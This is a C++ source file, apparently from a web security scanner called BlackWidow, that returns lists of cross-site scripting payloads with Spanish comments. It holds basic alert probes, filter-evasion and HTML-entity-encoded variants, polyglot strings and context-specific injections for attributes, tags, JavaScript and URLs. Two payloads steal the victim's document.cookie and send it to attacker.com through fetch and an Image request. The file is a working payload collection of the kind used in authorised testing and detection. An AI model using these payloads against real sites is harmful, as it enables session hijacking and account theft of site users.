/**
 * XssPayloads.cpp
 * Implementación de payloads para detección y explotación de vulnerabilidades XSS
 */

#include "XssPayloads.h"
#include <vector>
#include <string>

namespace BlackWidow {
namespace Security {
namespace Payloads {

std::vector<std::string> XssPayloads::getBasicPayloads() {
    return {
        // Payloads básicos para detección
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        
        // Payloads con evasión
        "<img src=\"x\" onerror=\"javascript:alert('XSS')\">",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
        
        // Payloads para DOM XSS
        "<a href=\"javascript:alert('XSS')\">",
        "'><script>alert('XSS')</script>",
        "\"autofocus onfocus=alert('XSS')\""
    };
}

std::vector<std::string> XssPayloads::getAdvancedPayloads() {
    return {
        // Evasión de filtros
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<svg/onload=alert('XSS')>",
        
        // Payloads sin comillas
        "<svg onload=alert(document.domain)>",
        "<svg onload=alert(/XSS/)>",
        
        // Payloads con codificación
        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;>",
        "<iframe src=\"javascript:&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">",
        
        // Payloads para explotación avanzada
        "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        "<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie</script>"
    };
}

std::vector<std::string> XssPayloads::getPolyglotPayloads() {
    return {
        // Payloads políglotas (funcionan en múltiples contextos)
        "javascript:\"'><script>alert('XSS')</script>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>",
        "'\"><img src=x onerror=alert('XSS')>",
        "'\"><svg/onload=alert(/XSS/)//"
    };
}

std::vector<std::string> XssPayloads::getContextSpecificPayloads(XssContext context) {
    switch(context) {
        case XssContext::HTML_ATTRIBUTE:
            return {
                "\" onmouseover=alert('XSS') \"",
                "\" onfocus=alert('XSS') autofocus \"",
                "\" onload=alert('XSS') \""
            };
        case XssContext::HTML_TAG:
            return {
                "<svg onload=alert('XSS')>",
                "<img src=x onerror=alert('XSS')>",
                "<body onload=alert('XSS')>"
            };
        case XssContext::JAVASCRIPT:
            return {
                "';alert('XSS');//",
                "\\';alert('XSS');//",
                "</script><script>alert('XSS')</script>"
            };
        case XssContext::URL:
            return {
                "javascript:alert('XSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
                "data:text/html,<script>alert('XSS')</script>"
            };
        default:
            return getBasicPayloads();
    }
}

} // namespace Payloads
} // namespace Security
} // namespace BlackWidow